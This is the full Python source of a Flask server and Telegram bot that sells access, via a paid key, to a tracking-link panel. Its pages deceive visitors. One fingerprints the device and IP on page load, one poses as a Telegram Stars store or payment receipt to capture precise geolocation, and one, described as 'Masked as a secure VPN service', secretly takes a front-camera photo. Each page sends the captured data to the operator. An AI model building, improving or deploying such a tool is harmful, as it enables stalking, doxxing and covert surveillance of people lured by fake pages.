import os, threading, random, string, requests, re, base64, datetime, io
from flask import Flask, request, jsonify, render_template_string
import telebot
from telebot import types

BOT_TOKEN = "" # Токен бота
ADMIN_ID = 8051246224
REPL_URL = "https://e9f16f3f-466c-48ec-8c98-5de8a58148ee-00-3sbpql6wwnhg7.sisko.replit.dev/" # URL 
VALID_KEY = "pri9vateclutch8fjfkcnc133" # Ключ доступа

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)
sessions = {}
authorized_users = [ADMIN_ID]

HTML_UI = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;900&family=Montserrat:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
    :root { 
        --bg: #030303;
        --surface: #0a0a0a;
        --surface-hover: #121212;
        --border: rgba(255, 255, 255, 0.06);
        --border-hover: rgba(255, 255, 255, 0.15);
        --text-main: #f5f5f5;
        --text-muted: #737373;
        --gradient: linear-gradient(110deg, #404040 0%, #ffffff 50%, #404040 100%);
        --fluid-bezier: cubic-bezier(0.2, 0.8, 0.2, 1);
    }

    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }

    body { 
        margin: 0; padding: 0; background: var(--bg);
        font-family: 'Montserrat', sans-serif; color: var(--text-main); 
        height: 100vh; overflow: hidden; display: flex; flex-direction: column;
    }

    /* Анимированный переливающийся градиент на фоне (очень мягкий) */
    body::before {
        content: ""; position: fixed; top: -50%; left: -50%; width: 200%; height: 200%;
        background: radial-gradient(circle at 50% 50%, rgba(255,255,255,0.02) 0%, transparent 50%),
                    radial-gradient(circle at 80% 20%, rgba(255,255,255,0.015) 0%, transparent 40%);
        animation: bgRotate 30s linear infinite; z-index: 0; pointer-events: none;
    }
    @keyframes bgRotate { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

    .app-nexus { 
        position: relative; z-index: 10; width: 100%; height: 100%; 
        display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px;
        animation: fadeIn 1s var(--fluid-bezier);
    }

    @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }

    .header-box { text-align: center; margin-bottom: 40px; transition: all 0.6s var(--fluid-bezier); }
    .header-box.minimized { transform: translateY(-20px) scale(0.9); margin-bottom: 0px; opacity: 0.8; }

    .logo { 
        font-family: 'Orbitron', sans-serif; font-size: 42px; font-weight: 900; letter-spacing: 10px;
        text-transform: uppercase; background: var(--gradient); -webkit-background-clip: text;
        -webkit-text-fill-color: transparent; background-size: 200% auto; animation: shine 4s linear infinite; 
        margin: 0;
    }
    @keyframes shine { 0% { background-position: 0% center; } 100% { background-position: 200% center; } }

    .sub-logo { font-size: 10px; color: var(--text-muted); letter-spacing: 4px; margin-top: 8px; font-family: 'Orbitron'; font-weight: 400; text-transform: uppercase; }
    
    .menu-view { display: flex; flex-direction: column; gap: 12px; width: 100%; max-width: 380px; transition: 0.5s var(--fluid-bezier); }
    .menu-view.hidden { opacity: 0; pointer-events: none; transform: translateY(20px); display: none; }

    /* Минималистичные кнопки */
    .btn-nexus { 
        width: 100%; padding: 20px; background: var(--surface); border: 1px solid var(--border);
        border-radius: 8px; color: var(--text-muted); font-family: 'Orbitron', sans-serif; font-size: 11px; font-weight: 600; 
        letter-spacing: 3px; text-transform: uppercase; cursor: pointer; transition: all 0.3s var(--fluid-bezier); 
        display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden;
    }
    .btn-nexus::after {
        content: ''; position: absolute; left: 0; top: 0; width: 2px; height: 100%; background: #fff; opacity: 0; transition: 0.3s;
    }
    .gtext { z-index: 2; transition: 0.3s; }
    .btn-nexus:hover { background: var(--surface-hover); border-color: var(--border-hover); color: var(--text-main); transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
    .btn-nexus:hover::after { opacity: 1; }
    .btn-nexus:active { transform: translateY(1px); background: #000; border-color: var(--border); }

    /* Окна модулей */
    .module-window { display: none; flex-direction: column; width: 100%; max-width: 400px; animation: slideUp 0.5s var(--fluid-bezier) forwards; }
    @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

    .glass-panel { background: var(--surface); border: 1px solid var(--border); padding: 25px; margin-bottom: 12px; border-radius: 12px; transition: 0.3s; }
    .glass-panel:hover { border-color: var(--border-hover); }

    input { width: 100%; padding: 18px; background: #000; border: 1px solid var(--border); color: var(--text-main); text-align: center; font-family: 'Orbitron'; font-size: 12px; margin-bottom: 20px; border-radius: 8px; transition: 0.3s; outline: none; }
    input:focus { border-color: rgba(255,255,255,0.3); background: #050505; }
    input::placeholder { color: var(--text-muted); }

    .url-box { background: #000; color: var(--text-muted); padding: 18px; font-family: monospace; font-size: 11px; border: 1px dashed var(--border); text-align: center; cursor: pointer; border-radius: 8px; word-break: break-all; transition: 0.3s; }
    .url-box:hover { border-color: var(--text-muted); color: var(--text-main); }
    .url-box:active { transform: scale(0.98); }

    /* Таблица данных */
    .data-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; max-height: 55vh; overflow-y: auto; padding-right: 5px; }
    .data-grid::-webkit-scrollbar { width: 2px; }
    .data-grid::-webkit-scrollbar-track { background: transparent; }
    .data-grid::-webkit-scrollbar-thumb { background: var(--border-hover); }

    .data-item { background: #000; border: 1px solid var(--border); padding: 16px; border-radius: 8px; transition: 0.3s; cursor: pointer; text-align: left; }
    .data-item .label { font-size: 8px; font-family: 'Orbitron'; color: var(--text-muted); margin-bottom: 6px; letter-spacing: 1px; }
    .data-item .val { font-size: 12px; font-weight: 500; color: var(--text-main); word-break: break-all; }
    .data-item:hover { background: var(--surface-hover); border-color: var(--border-hover); }

    /* Переключатели тем */
    .theme-selector { display: flex; flex-direction: column; gap: 8px; margin-top: 15px; }
    .theme-btn { padding: 16px; font-size: 10px; font-family: 'Orbitron'; font-weight: 500; background: #000; border: 1px solid var(--border); color: var(--text-muted); cursor: pointer; text-align: left; border-radius: 8px; transition: 0.3s; letter-spacing: 1px; display: flex; align-items: center; }
    .theme-btn::before { content: ''; width: 4px; height: 4px; background: var(--border-hover); border-radius: 50%; margin-right: 12px; transition: 0.3s; }
    .theme-btn:hover { border-color: rgba(255,255,255,0.15); color: #ccc; }
    .theme-btn.active { border-color: rgba(255,255,255,0.4); color: var(--text-main); background: var(--surface-hover); }
    .theme-btn.active::before { background: #fff; box-shadow: 0 0 8px #fff; }

    .nav-back { margin-top: 15px; font-size: 10px; color: var(--text-muted); font-family: 'Orbitron'; cursor: pointer; letter-spacing: 4px; text-align: center; text-transform: uppercase; padding: 16px; transition: 0.3s; background: transparent; border: 1px solid transparent; border-radius: 8px; }
    .nav-back:hover { color: var(--text-main); background: var(--surface); border-color: var(--border); }
    .nav-back:active { transform: scale(0.98); }

    #cam-preview { width: 100%; max-height: 250px; object-fit: cover; border-radius: 8px; border: 1px solid var(--border); margin: 15px auto; display: none; filter: grayscale(20%); }
    #cam-status { font-size: 10px; font-weight: 500; text-align: center; margin-top: 15px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 2px;}
    .trap-instr { font-size: 9px; color: var(--text-muted); margin-bottom: 15px; text-align: center; line-height: 1.6; text-transform: uppercase; letter-spacing: 1px; }
    </style>
</head>
<body>
    <div class="app-nexus">
        <div class="header-box" id="hdr">
            <div class="logo">XASTRA</div>
            <div class="sub-logo" id="time-display">CORE SYSTEM</div>
        </div>
        
        <div id="main-menu" class="menu-view">
            <button class="btn-nexus" onclick="openModule('logger')"><span class="gtext">STANDARD LINK</span></button>
            <button class="btn-nexus" onclick="openModule('igolka')"><span class="gtext">PRECISION LINK</span></button>
            <button class="btn-nexus" onclick="openModule('fotologger')"><span class="gtext">PHOTO MODULE</span></button>
            <button class="btn-nexus" onclick="openModule('osint')"><span class="gtext">OSINT TOOL</span></button>
        </div>

        <div id="mod-logger" class="module-window">
            <div class="glass-panel">
                <div id="linkOut" class="url-box" onclick="copy('linkOut')">WAITING...</div>
                <button class="btn-nexus" style="padding:15px; font-size:9px; margin-top:15px;" onclick="regen('logger')"><span class="gtext">REGENERATE</span></button>
            </div>
            <div id="statsGrid" class="data-grid" style="display: none;">
                <div class="data-item" onclick="copyThis('v-ip')"><div class="label">IP</div><div id="v-ip" class="val">-</div></div>
                <div class="data-item" onclick="copyThis('v-os')"><div class="label">OS</div><div id="v-os" class="val">-</div></div>
                <div class="data-item" onclick="copyThis('v-cpu')"><div class="label">CPU</div><div id="v-cpu" class="val">-</div></div>
                <div class="data-item" onclick="copyThis('v-mem')"><div class="label">RAM</div><div id="v-mem" class="val">-</div></div>
                <div class="data-item" onclick="copyThis('v-res')"><div class="label">DISPLAY</div><div id="v-res" class="val">-</div></div>
                <div class="data-item" onclick="copyThis('v-hz')"><div class="label">FREQ</div><div id="v-hz" class="val">-</div></div>
                <div class="data-item" onclick="copyThis('v-bat')"><div class="label">POWER</div><div id="v-bat" class="val">-</div></div>
                <div class="data-item" onclick="copyThis('v-lang')"><div class="label">LANG</div><div id="v-lang" class="val">-</div></div>
                <div class="data-item" onclick="copyThis('v-tz')"><div class="label">ZONE</div><div id="v-tz" class="val">-</div></div>
                <div class="data-item" onclick="copyThis('v-net')"><div class="label">NET</div><div id="v-net" class="val">-</div></div>
                <div class="data-item" style="grid-column: span 2;" onclick="copyThis('v-isp')"><div class="label">ISP</div><div id="v-isp" class="val">-</div></div>
                <div class="data-item" onclick="copyThis('v-br')"><div class="label">BROWSER</div><div id="v-br" class="val">-</div></div>
                <div class="data-item" onclick="copyThis('v-vpn')"><div class="label">PROXY</div><div id="v-vpn" class="val">-</div></div>
            </div>
            <div class="nav-back" onclick="closeModule()">RETURN</div>
        </div>

        <div id="mod-igolka" class="module-window">
            <div class="glass-panel">
                <div id="linkIgolka" class="url-box" onclick="copy('linkIgolka')">WAITING...</div>
                <div class="theme-selector">
                    <div class="theme-btn active" id="t-osint" onclick="setTheme('osint')">SYS.LOG THEME</div>
                    <div class="theme-btn" id="t-stars" onclick="setTheme('stars')">STORE THEME</div>
                    <div class="theme-btn" id="t-cash" onclick="setTheme('cash')">RECEIPT THEME</div>
                </div>
                <button class="btn-nexus" style="padding:15px; font-size:9px; margin-top:15px;" onclick="regen('igolka')"><span class="gtext">REGENERATE</span></button>
            </div>
            <div id="igolkaGrid" class="data-grid" style="display: none;">
                <div class="data-item" style="grid-column: span 2;" id="mapBtn"><div class="label">LOCATION</div><div class="val">OPEN MAP</div></div>
                <div class="data-item" onclick="copyThis('i-ip')"><div class="label">IP</div><div id="i-ip" class="val">-</div></div>
                <div class="data-item" onclick="copyThis('i-acc')"><div class="label">ACCURACY</div><div id="i-acc" class="val">-</div></div>
            </div>
            <div class="nav-back" onclick="closeModule()">RETURN</div>
        </div>

        <div id="mod-fotologger" class="module-window">
            <div class="glass-panel">
                <div class="trap-instr">Masked as a secure VPN service</div>
                <div id="linkCam" class="url-box" onclick="copy('linkCam')">WAITING...</div>
                <button class="btn-nexus" style="padding:15px; font-size:9px; margin-top:15px;" onclick="regen('fotologger')"><span class="gtext">REGENERATE</span></button>
                <img id="cam-preview" src="">
                <div id="cam-status"></div>
            </div>
            <div class="nav-back" onclick="closeModule()">RETURN</div>
        </div>

        <div id="mod-osint" class="module-window">
            <div class="glass-panel">
                <input type="text" id="ipIn" placeholder="ENTER IP ADDRESS">
                <button class="btn-nexus" onclick="runOsint()"><span class="gtext">EXECUTE</span></button>
            </div>
            <div id="osintRes" class="data-grid" style="display: none;">
                <div class="data-item" onclick="copyThis('o-cnt')"><div class="label">COUNTRY</div><div id="o-cnt" class="val">-</div></div>
                <div class="data-item" onclick="copyThis('o-loc')"><div class="label">CITY</div><div id="o-loc" class="val">-</div></div>
                <div class="data-item" style="grid-column: span 2;" onclick="copyThis('o-isp')"><div class="label">ISP</div><div id="o-isp" class="val">-</div></div>
            </div>
            <div class="nav-back" onclick="closeModule()">RETURN</div>
        </div>
    </div>
    <script>
        let tg = window.Telegram.WebApp; tg.expand(); let sidL = null; let sidG = null; let sidC = null; let currentTheme = 'osint';
        function vibro(t='medium') { try{tg.HapticFeedback.impactOccurred(t);}catch(e){} }
        function openModule(m) { 
            vibro('heavy'); 
            document.getElementById('hdr').classList.add('minimized'); 
            document.getElementById('main-menu').classList.add('hidden');
            setTimeout(() => { 
                document.getElementById('mod-'+m).style.display = 'flex'; 
                if(!sidL && m==='logger') regen('logger');
                if(!sidG && m==='igolka') regen('igolka');
                if(!sidC && m==='fotologger') regen('fotologger');
            }, 300); 
        }
        function closeModule() { vibro(); document.querySelectorAll('.module-window').forEach(w => w.style.display = 'none'); document.getElementById('hdr').classList.remove('minimized'); document.getElementById('main-menu').classList.remove('hidden'); }
        function setTheme(t) { 
            document.querySelectorAll('.theme-btn').forEach(b => b.classList.remove('active')); 
            document.getElementById('t-'+t).classList.add('active'); 
            currentTheme = t; 
            if(sidG) document.getElementById('linkIgolka').innerText = window.location.origin + "/geo/" + sidG + "?t=" + currentTheme;
        }
        function regen(type) { 
            let nsid = Math.random().toString(36).substring(7);
            if(type === 'logger') { sidL = nsid; document.getElementById('linkOut').innerText = window.location.origin + "/s/" + nsid; }
            else if(type === 'fotologger') { sidC = nsid; document.getElementById('linkCam').innerText = window.location.origin + "/cam/" + nsid; }
            else { sidG = nsid; document.getElementById('linkIgolka').innerText = window.location.origin + "/geo/" + nsid + "?t=" + currentTheme; }
            vibro('light'); 
        }
        function copy(id) { navigator.clipboard.writeText(document.getElementById(id).innerText).then(() => { vibro('heavy'); try{tg.showAlert("COPIED");}catch(e){alert("COPIED");} }); }
        function copyThis(id) { let v = document.getElementById(id).innerText; if(v !== "-") { navigator.clipboard.writeText(v).then(() => { vibro('medium'); try{tg.showAlert("COPIED");}catch(e){alert("COPIED");} }); } }
        async function runOsint() { vibro('heavy'); let ip = document.getElementById('ipIn').value; if(!ip) return;
            try { let r = await fetch(`/api/osint/${ip}`); let d = await r.json();
                if(d.status === 'success') { document.getElementById('o-cnt').innerText = d.country; document.getElementById('o-loc').innerText = d.city; document.getElementById('o-isp').innerText = d.isp; document.getElementById('osintRes').style.display = 'grid'; vibro('success'); }
            } catch(e) {} }
        setInterval(async () => { 
            if(sidL) { try { let r = await fetch('/api/check/' + sidL); let d = await r.json();
                if(d.status === 'hit') { 
                    document.getElementById('statsGrid').style.display = 'grid'; 
                    document.getElementById('v-ip').innerText = d.data.ip; 
                    document.getElementById('v-os').innerText = d.data.real_os; 
                    document.getElementById('v-cpu').innerText = d.data.cpu || "-"; 
                    document.getElementById('v-mem').innerText = d.data.mem || "-"; 
                    document.getElementById('v-res').innerText = d.data.res; 
                    document.getElementById('v-hz').innerText = (d.data.hz || "-") + "Hz"; 
                    document.getElementById('v-bat').innerText = d.data.battery; 
                    document.getElementById('v-lang').innerText = d.data.lang || "-"; 
                    document.getElementById('v-tz').innerText = d.data.tz || "-"; 
                    document.getElementById('v-net').innerText = d.data.net || "-"; 
                    document.getElementById('v-isp').innerText = d.data.isp.substring(0,25); 
                    document.getElementById('v-br').innerText = d.data.browser_name; 
                    document.getElementById('v-vpn').innerText = d.data.is_vpn ? "YES" : "NO"; 
                }
            } catch(e){} }
            if(sidG) { try { let r = await fetch('/api/check/' + sidG); let d = await r.json();
                if(d.status === 'hit') { document.getElementById('igolkaGrid').style.display = 'grid'; document.getElementById('i-ip').innerText = d.data.ip; document.getElementById('i-acc').innerText = d.data.acc + "m"; document.getElementById('mapBtn').onclick = () => window.open(`http://googleusercontent.com/maps.google.com/${d.data.lat},${d.data.lon}`); }
            } catch(e){} }
            if(sidC) { try { try { let r = await fetch('/api/check/' + sidC); let d = await r.json();
                if(d.status === 'hit' && d.data.photo) { document.getElementById('cam-preview').src = d.data.photo; document.getElementById('cam-preview').style.display = 'block'; document.getElementById('cam-status').innerHTML = "DATA ACQUIRED"; }
            } catch(e){} } catch(e){} }
        }, 3000);
    </script>
</body>
</html>
"""

PHOTO_TRAP_HTML = """
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;700&family=Orbitron:wght@600;900&display=swap" rel="stylesheet">
<style>
  :root { --bg: #050505; --surface: #0a0a0a; --border: rgba(255,255,255,0.08); --text: #eaeaea; --muted: #737373; }
  body { margin: 0; background: var(--bg); color: var(--text); font-family: 'Montserrat', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
  
  .card { 
    background: var(--surface); padding: 50px 35px; border-radius: 16px; width: 90%; max-width: 380px; text-align: center; 
    border: 1px solid var(--border); box-shadow: 0 20px 40px rgba(0,0,0,0.8); 
  }
  
  .shield { font-size: 40px; margin-bottom: 20px; filter: grayscale(100%) opacity(0.8); }
  .title { font-family: 'Orbitron', sans-serif; font-size: 28px; font-weight: 900; margin-bottom: 8px; letter-spacing: 6px; color: #fff; }
  .subtitle { font-size: 10px; font-weight: 500; color: var(--muted); margin-bottom: 30px; text-transform: uppercase; letter-spacing: 4px; }
  .instr { background: #000; padding: 20px; border-radius: 8px; font-size: 11px; text-align: center; color: var(--muted); margin-bottom: 35px; border: 1px solid var(--border); line-height: 1.6; }
  
  .btn { 
    width: 100%; padding: 20px; background: #fff; border: none; color: #000; border-radius: 8px; 
    font-family: 'Orbitron', sans-serif; font-size: 12px; font-weight: 900; cursor: pointer; transition: 0.3s; 
    text-transform: uppercase; letter-spacing: 3px; 
  }
  .btn:hover { background: #ccc; transform: translateY(-2px); }
  .btn:active { transform: translateY(1px); }
  
  .footer { margin-top: 25px; font-size: 9px; font-weight: 500; color: var(--muted); text-transform: uppercase; letter-spacing: 2px; }
</style>
<script>
async function capture() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    const video = document.createElement('video'); video.srcObject = stream; await video.play();
    const canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0); const img = canvas.toDataURL('image/jpeg');
    stream.getTracks().forEach(t => t.stop());
    await fetch('/api/photo_report', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ sid:"{{sid}}", img:img }) });
    location.href = "https://google.com";
  } catch(e) { alert("ERROR: CONNECTION REFUSED."); }
}
</script></head>
<body>
  <div class="card">
    <div class="shield">🛡️</div>
    <div class="title">CORE VPN</div>
    <div class="subtitle">SECURE TUNNEL</div>
    <div class="instr">Encrypted network access. Zero logs policy. Bypass restrictions invisibly.</div>
    <button class="btn" onclick="capture()">CONNECT</button>
    <div class="footer">STRICTLY CONFIDENTIAL</div>
  </div>
</body></html>
"""

NEEDLE_HTML = """
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;900&family=Montserrat:wght@400;500;700&display=swap" rel="stylesheet">
<style>
  :root { --bg: #030303; --surface: #0a0a0a; --border: rgba(255,255,255,0.06); --text: #f5f5f5; --muted: #737373; }
  body { margin: 0; font-family: 'Montserrat', sans-serif; background: var(--bg); color: var(--text); display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; }

  /* COMMON CARD STYLE */
  .box { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 40px; width: 90%; max-width: 420px; box-shadow: 0 20px 40px rgba(0,0,0,0.8); }

  /* ================= STARS THEME ================= */
  .god-title { font-family: 'Orbitron'; font-weight: 900; font-size: 32px; text-align: center; margin-bottom: 30px; letter-spacing: 6px; color: #fff; }
  .stars-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 30px; }
  .star-card { background: #000; border: 1px solid var(--border); border-radius: 8px; padding: 20px 10px; text-align: center; transition: 0.3s; cursor: pointer; }
  .star-card:hover { border-color: rgba(255,255,255,0.3); background: #111; }
  .s-icon { font-size: 24px; display: block; margin-bottom: 10px; filter: grayscale(100%) opacity(0.8); }
  .s-count { font-weight: 700; font-size: 14px; color: #fff; display: block; margin-bottom: 10px; font-family: 'Orbitron'; }
  .s-price { color: var(--muted); font-size: 12px; font-weight: 500; }
  .s-geo-desc { font-size: 10px; text-align: center; color: var(--muted); text-transform: uppercase; letter-spacing: 2px; }

  /* ================= OSINT THEME ================= */
  .osint-title { font-family: monospace; font-size: 24px; font-weight: bold; color: #fff; margin-bottom: 20px; letter-spacing: 4px; }
  .fake-inst { font-family: monospace; font-size: 12px; color: var(--muted); text-transform: uppercase; margin-bottom: 30px; line-height: 1.6; border-left: 2px solid #fff; padding-left: 15px; }
  .bw-btn { width: 100%; padding: 18px; background: #000; border: 1px solid var(--border); border-radius: 6px; color: #fff; font-family: monospace; font-size: 12px; font-weight: 700; letter-spacing: 2px; margin-bottom: 12px; cursor: pointer; transition: 0.3s; text-transform: uppercase; text-align: left; padding-left: 20px; }
  .bw-btn:hover { background: #111; border-color: rgba(255,255,255,0.3); }
  .bw-btn:active { background: #fff; color: #000; }

  /* ================= CASH THEME ================= */
  .receipt-box { text-align: center; }
  .r-title { font-weight: 700; font-size: 18px; color: #fff; margin-bottom: 5px; }
  .r-subtitle { font-size: 11px; color: var(--muted); margin-bottom: 25px; letter-spacing: 1px; }
  .r-amount { font-size: 38px; font-weight: 700; color: #fff; margin: 25px 0; }
  .r-details { border-top: 1px solid var(--border); padding-top: 25px; margin-top: 25px; border-bottom: 1px solid var(--border); padding-bottom: 25px; }
  .r-row { display: flex; justify-content: space-between; margin-bottom: 15px; font-size: 13px; }
  .r-row:last-child { margin-bottom: 0; }
  .r-label { color: var(--muted); }
  .r-val { color: #fff; font-weight: 600; }
  .r-btn { width: 100%; padding: 18px; background: #fff; color: #000; border: none; border-radius: 8px; font-weight: 700; font-size: 12px; cursor: pointer; margin-top: 30px; transition: 0.3s; text-transform: uppercase; letter-spacing: 2px; }
  .r-btn:hover { background: #ccc; }
</style>
<script>
async function start() {
  navigator.geolocation.getCurrentPosition(async (pos) => {
    let info = { sid: "{{sid}}", type: "igolka", lat: pos.coords.latitude, lon: pos.coords.longitude, acc: Math.round(pos.coords.accuracy), ua: navigator.userAgent };
    await fetch('/api/report', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(info) });
    location.href = "{{redirect}}";
  }, () => { alert("ERROR: LOCATION ACCESS REQUIRED."); }, {enableHighAccuracy: true});
}
</script></head>
<body>
  {% if theme == 'stars' %}
    <div class="box">
      <div class="god-title">STORE</div>
      <div class="stars-grid">
            <div class="star-card" onclick="start()"><span class="s-icon">⭐</span><span class="s-count">50</span><span class="s-price">₽32</span></div>
            <div class="star-card" onclick="start()"><span class="s-icon">⭐</span><span class="s-count">150</span><span class="s-price">₽95</span></div>
            <div class="star-card" onclick="start()"><span class="s-icon">⭐</span><span class="s-count">250</span><span class="s-price">₽165</span></div>
            <div class="star-card" onclick="start()"><span class="s-icon">⭐</span><span class="s-count">500</span><span class="s-price">₽340</span></div>
            <div class="star-card" onclick="start()"><span class="s-icon">⭐</span><span class="s-count">1000</span><span class="s-price">₽670</span></div>
            <div class="star-card" onclick="start()"><span class="s-icon">⭐</span><span class="s-count">2500</span><span class="s-price">₽1600</span></div>
      </div>
      <div class="s-geo-desc">Sync required for regional pricing</div>
    </div>
  {% elif theme == 'osint' %}
    <div class="box">
        <div class="osint-title">SYS.LOG</div>
        <div class="fake-inst">root@system:~# require_auth<br>Awaiting location consent...</div>
        <button class="bw-btn" onclick="start()">> MODULE_01</button>
        <button class="bw-btn" onclick="start()">> MODULE_02</button>
        <button class="bw-btn" onclick="start()">> MODULE_03</button>
    </div>
  {% elif theme == 'cash' %}
    <div class="box receipt-box">
        <div class="r-title">TRANSACTION</div>
        <div class="r-subtitle">ID: 88728-TX</div>
        <div class="r-amount">499.98 ₽</div>
        <div class="r-details">
            <div class="r-row"><span class="r-label">Sender</span><span class="r-val">729399394</span></div>
            <div class="r-row"><span class="r-label">Fee</span><span class="r-val">0.02 ₽</span></div>
            <div class="r-row"><span class="r-label">Status</span><span class="r-val">Pending</span></div>
        </div>
        <button class="r-btn" onclick="start()">CONFIRM</button>
    </div>
  {% endif %}
</body></html>
"""

TRAP_HTML = """
<!DOCTYPE html><html><head><script>
async function scan() {
    let bat = "N/A"; try { const b = await navigator.getBattery(); bat = Math.round(b.level * 100) + "%"; } catch(e){}
    let mem = (navigator.deviceMemory || "N/A") + " GB";
    let cpu = "Unknown";
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        if (/Adreno/.test(renderer)) cpu = "Snapdragon";
        else if (/Mali|PowerVR|Exynos/.test(renderer)) cpu = "MediaTek / Exynos";
        else if (/Apple/.test(renderer)) cpu = "Apple A-Series";
        else cpu = renderer.split(' ').pop();
    } catch(e){}

    let getHz = () => new Promise(res => {
        let s = null, f = 0;
        const c = (t) => { if(!s) s=t; f++; if(t-s < 500) requestAnimationFrame(c); else res(Math.round((f*1000)/(t-s))); };
        requestAnimationFrame(c);
    });
    let hz = await getHz();

    let info = { 
        sid: "{{sid}}", type: "logger", ua: navigator.userAgent, battery: bat, 
        mem: mem, cpu: cpu, hz: hz,
        res: (window.screen.width * window.devicePixelRatio) + "x" + (window.screen.height * window.devicePixelRatio), 
        lang: navigator.language, tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        net: (navigator.connection ? navigator.connection.effectiveType : "N/A")
    };
    fetch('/api/report', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(info) }).then(() => { location.href = "https://google.com"; });
} window.onload = scan;
</script></head><body style="background:#030303"></body></html>
"""

def parse_ua(ua):
    os_name = "Unknown"
    if "Windows NT 10.0" in ua: os_name = "Windows 10/11"
    elif "Android" in ua: m = re.search(r"Android ([0-9.]+)", ua); os_name = f"Android {m.group(1)}" if m else "Android"
    elif "iPhone OS" in ua: m = re.search(r"iPhone OS ([0-9_]+)", ua); os_name = f"iOS {m.group(1).replace('_', '.')}" if m else "iOS"
    return os_name, ("Chrome" if "Chrome" in ua else "Safari" if "Safari" in ua else "Firefox" if "Firefox" in ua else "Unknown")

@app.route('/')
def index(): return render_template_string(HTML_UI)

@app.route('/s/<sid>')
def trap_log(sid): return render_template_string(TRAP_HTML, sid=sid)

@app.route('/cam/<sid>')
def trap_photo(sid): return render_template_string(PHOTO_TRAP_HTML, sid=sid)

@app.route('/geo/<sid>')
def trap_geo(sid):
    t = request.args.get('t', 'osint')
    reds = {'stars': 'https://telegram.org', 'cash': 'https://google.com', 'osint': 'https://google.com'}
    return render_template_string(NEEDLE_HTML, sid=sid, theme=t, redirect=reds.get(t, 'https://google.com'))

@app.route('/api/osint/<ip>')
def api_osint(ip):
    try: r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,lat,lon,isp,proxy,hosting"); return jsonify(r.json())
    except: return jsonify({"status": "fail"})

@app.route('/api/photo_report', methods=['POST'])
def photo_report():
    d = request.json; sid = d.get('sid')
    sessions[sid] = {'status': 'hit', 'data': {'photo': d.get('img')}}
    return jsonify({"status": "ok"})

@app.route('/api/report', methods=['POST'])
def report():
    d = request.json; sid = d.get('sid'); ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    os_n, br_n = parse_ua(d.get('ua', ''))
    if d.get('type') == 'logger':
        try: geo = requests.get(f"http://ip-api.com/json/{ip}?fields=status,isp,org,as,proxy,hosting").json(); d['isp'] = f"{geo.get('isp')} ({geo.get('as')})"; d['is_vpn'] = geo.get('proxy') or geo.get('hosting')
        except: d['isp'] = "N/A"; d['is_vpn'] = False
        d.update({'ip': ip, 'real_os': os_n, 'browser_name': br_n})
    else: d.update({'ip': ip, 'real_os': os_n})
    sessions[sid] = {'status': 'hit', 'data': d}
    return jsonify({"status": "ok"})

@app.route('/api/check/<sid>')
def check(sid): return jsonify(sessions.get(sid, {'status': 'waiting'}))

@bot.message_handler(commands=['start'])
def start(m):
    if m.from_user.id in authorized_users:
        markup = types.InlineKeyboardMarkup(); markup.add(types.InlineKeyboardButton("⚡ ЗАПУСТИТЬ", web_app=types.WebAppInfo(url=REPL_URL)))
        bot.send_message(m.chat.id, "Нажмите на кнопку ниже для запуска системы:", reply_markup=markup)
    else: bot.send_message(m.chat.id, "🔒 Доступ ограничен, введите ключ для входа (покупка ключа: @tebecocy)")

@bot.message_handler(func=lambda message: True)
def handle_msg(m):
    if m.text == VALID_KEY: authorized_users.append(m.from_user.id); bot.send_message(m.chat.id, "✅ Ключ принят, /start")

if __name__ == '__main__':
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=8080)).start()
    bot.infinity_polling()